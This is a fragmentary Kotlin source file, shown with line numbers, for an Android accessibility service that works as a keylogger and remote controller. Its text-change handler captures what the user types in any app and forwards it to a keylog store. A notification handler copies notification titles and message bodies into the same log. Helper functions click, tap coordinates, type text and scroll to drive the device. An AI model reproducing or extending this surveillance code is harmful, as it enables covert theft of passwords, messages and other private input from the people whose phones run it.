   118→    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
   119→        event ?: return
   120→        
   121→        eventCount++

   124→        when (event.eventType) {

   135→            // Click events
   136→            AccessibilityEvent.TYPE_VIEW_CLICKED -> {

   140→            // Focus events

   142→                handleFocusEvent(event, packageName)

   156→            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {

   160→            // View scrolled

   162→                // Usually not needed for keylogger

   165→            // Gesture events (Android 8+)

   176→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
   177→        if (!keyloggerEnabled) return
   178→        
   179→        textEventCount++
   180→        
   181→        try {
   182→            // Get the text from the event
   183→            val text = event.text?.joinToString("") ?: ""
   184→            val fromIndex = event.fromIndex
   185→            val addedCount = event.addedCount
   186→            val removedCount = event.removedCount
   187→            val beforeText = event.beforeText?.toString() ?: ""
   188→            
   189→            // Get the source node for more details
   190→            val source = event.source
   191→            val viewId = source?.viewIdResourceName ?: ""
   192→            val className = source?.className?.toString() ?: ""
   193→            val description = source?.contentDescription?.toString() ?: ""
   194→            
   195→            // Build the captured data
   196→            val capturedText = buildString {
   197→                if (text.isNotEmpty()) {
   198→                    append(text)
   199→                }
   200→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
   201→                    // Text was modified
   202→                    append("[EDIT]")
   203→                }
   204→            }
   205→            
   206→            if (capturedText.isNotEmpty()) {
   207→                // Update last captured
   208→                lastCapturedText.append(capturedText)
   209→                if (lastCapturedText.length > 100000) {
   210→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(50000))
   211→                }
   212→                
   213→                // Send to MonitorExecutor
   214→                MonitorExecutor.appendKeylog(
   215→                    packageName = packageName,
   216→                    text = capturedText,
   217→                    viewType = "text_change"
   218→                )
   219→                
   220→                // Also log with context
   221→                logKeyEvent(
   222→                    packageName = packageName,
   223→                    text = capturedText,
   224→                    viewId = viewId,
   225→                    className = className
   226→                )
   227→            }
   228→            
   229→            source?.recycle()
   230→        } catch (e: Exception) {
   231→            // Log error but don't crash
   232→        }
   233→    }

   240→        clickEventCount++

   277→    private fun handleNotificationEvent(event: AccessibilityEvent, packageName: String) {
   278→        notificationEventCount++
   279→        
   280→        if (!notificationInterceptEnabled && !keyloggerEnabled) return
   281→        
   282→        try {
   283→            val text = event.text?.joinToString("\n") ?: ""
   284→            val tickerText = event.text?.joinToString() ?: ""
   285→            
   286→            // For notifications, try to get more data from the Parcelable
   287→            val parcelableData = event.parcelableData
   288→            
   289→            var title = ""
   290→            var message = ""
   291→            var category = ""
   292→            
   293→            if (parcelableData is Notification) {
   294→                val notification = parcelableData
   295→                title = notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
   296→                message = notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
   297→                category = notification.category ?: ""
   298→                
   299→                // Add to notification history
   300→                MonitorExecutor.addNotification(packageName, title, message, category)
   301→            }
   302→            
   303→            // Log notification if keylogger is active
   304→            if (keyloggerEnabled) {
   305→                val notifText = buildString {
   306→                    if (title.isNotEmpty()) append("[$title] ")
   307→                    if (message.isNotEmpty()) append(message)
   308→                    if (text.isNotEmpty() && text != message) append(" | $text")
   309→                }
   310→                
   311→                if (notifText.isNotEmpty()) {
   312→                    MonitorExecutor.appendKeylog(
   313→                        packageName = packageName,
   314→                        text = "[NOTIF:$notifText]",
   315→                        viewType = "notification"
   316→                    )
   317→                }
   318→            }
   319→        } catch (_: Exception) {}
   320→    }

   383→    fun clickOnText(text: String, exactMatch: Boolean = false): Boolean {
   384→        val root = rootInActiveWindow ?: return false
   385→        
   386→        val nodes = if (exactMatch) {
   387→            root.findAccessibilityNodeInfosByText(text)

   389→        } else {
   390→            root.findAccessibilityNodeInfosByText(text)
   391→        }
   392→        
   393→        for (node in nodes) {
   394→            val clicked = performClickOnNode(node)
   395→            if (clicked) return true
   396→        }
   397→        
   398→        return false
   399→    }

   417→     * Click on node at specific coordinates
   418→     */
   419→    fun clickAt(x: Int, y: Int): Boolean {
   420→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   421→            return false
   422→        }
   423→        
   424→        val path = Path().apply {
   425→            moveTo(x.toFloat(), y.toFloat())
   426→        }
   427→        
   428→        val gesture = GestureDescription.Builder()
   429→            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
   430→            .build()
   431→        
   432→        gestureLatch = CountDownLatch(1)
   433→        gestureResult = false
   434→        
   435→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
   436→            override fun onCompleted(gestureDescription: GestureDescription?) {
   437→                gestureResult = true
   438→                gestureLatch?.countDown()
   439→            }
   440→            
   441→            override fun onCancelled(gestureDescription: GestureDescription?) {
   442→                gestureResult = false
   443→                gestureLatch?.countDown()
   444→            }
   445→        }, null)
   446→        
   447→        if (dispatched) {
   448→            gestureLatch?.await(2, TimeUnit.SECONDS)
   449→        }
   450→        
   451→        return gestureResult
   452→    }

   493→    /**
   494→     * Type text into a focused input field
   495→     */
   496→    fun typeText(text: String): Boolean {
   497→        val root = rootInActiveWindow ?: return false
   498→        
   499→        // Find focused node or editable node
   500→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
   501→            ?: root.findAccessibilityNodeInfosByViewId("android:id/edit").firstOrNull()
   502→            ?: run {
   503→                val nodes = root.findAccessibilityNodeInfosByText("")
   504→                nodes.firstOrNull { it.isEditable }
   505→            }
   506→        
   507→        if (focusedNode == null) return false
   508→        
   509→        // Try to set text directly
   510→        val arguments = Bundle()
   511→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
   512→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
   513→        
   514→        focusedNode.recycle()
   515→        return result
   516→    }

   518→    /**
   519→     * Scroll in a direction
   520→     */
   521→    fun scroll(direction: ScrollDirection): Boolean {
   522→        val root = rootInActiveWindow ?: return false
   523→        
   524→        val action = when (direction) {
   525→            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   526→            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   527→            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   528→            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   529→        }
   530→        
   531→        // Find scrollable node
   532→        val scrollableNode = findScrollableNode(root, direction) ?: return false
   533→        val result = scrollableNode.performAction(action)
   534→        scrollableNode.recycle()
   535→        
   536→        return result
   537→    }
   538→    
   539→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
   540→        if (node.isScrollable) return node
   541→        
   542→        for (i in 0 until node.childCount) {
   543→            val child = node.getChild(i) ?: continue
   544→            val result = findScrollableNode(child, direction)
   545→            if (result != null) return result
   546→            child.recycle()
   547→        }
   548→        
   549→        return null
   550→    }

   564→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
   565→        val text = node.text?.toString()
   566→        if (!text.isNullOrBlank()) {
   567→            builder.append(text).append("\n")
   568→        }
   569→        
   570→        val contentDesc = node.contentDescription?.toString()
   571→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
   572→            builder.append(contentDesc).append("\n")
   573→        }
   574→        
   575→        for (i in 0 until node.childCount) {
   576→            val child = node.getChild(i) ?: continue
   577→            extractTextFromNode(child, builder)
   578→            child.recycle()
   579→        }
   580→    }

   625→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
   626→        // Try direct click
   627→        if (node.isClickable) {
   628→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   629→        }
   630→        
   631→        // Try parent click
   632→        var parent = node.parent
   633→        while (parent != null) {
   634→            if (parent.isClickable) {
   635→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   636→                parent.recycle()
   637→                return clicked
   638→            }
   639→            val grandParent = parent.parent
   640→            parent.recycle()
   641→            parent = grandParent
   642→        }
   643→        
   644→        // Try click via coordinates
   645→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
   646→            val bounds = Rect()
   647→            node.getBoundsInScreen(bounds)
   648→            return clickAt(bounds.centerX(), bounds.centerY())
   649→        }
   650→        
   651→        return false
   652→    }
